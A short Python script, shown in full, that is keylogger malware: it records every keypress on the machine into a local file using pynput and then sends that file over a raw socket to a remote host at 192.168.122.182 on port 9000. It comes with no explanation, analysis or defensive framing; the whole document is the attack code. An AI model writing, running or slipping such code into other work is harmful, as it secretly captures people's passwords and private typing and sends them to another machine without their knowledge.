```python
import pynput.keyboard
import socket
import os

def on_press(key):
    with open("keylogs.txt", "a") as f:
        try:
            f.write(str(key))
        except AttributeError:
            f.write(str(key).encode('utf-8'))

def transmit_file():
    s = socket.socket()
    s.connect(("192.168.122.182", 9000))
    with open("keylogs.txt", "rb") as f:
        bytes_read = f.read(4096)
        while bytes_read:
            s.sendall(bytes_read)
            bytes_read = f.read(4096)
    s.close()

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()

transmit_file()
```